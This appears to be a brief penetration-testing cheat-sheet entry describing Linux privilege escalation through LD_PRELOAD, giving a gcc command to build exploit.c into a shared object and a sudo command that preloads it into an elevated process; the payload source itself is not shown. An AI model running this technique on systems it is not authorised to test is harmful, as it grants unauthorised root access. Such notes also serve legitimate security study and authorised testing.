# LD_PRELOAD

You can inject a shared object file to be loaded alongside a process you can run within an elevated context.

## Compile
```
gcc -fPIC -shared -o exploit.so exploit.c -nostartfiles
```
If you face compile errors while building this, you may have to additionally include <unistd.h>.

## Utilise
```
sudo LD_PRELOAD=PATH/TO/exploit.so <COMMAND>
```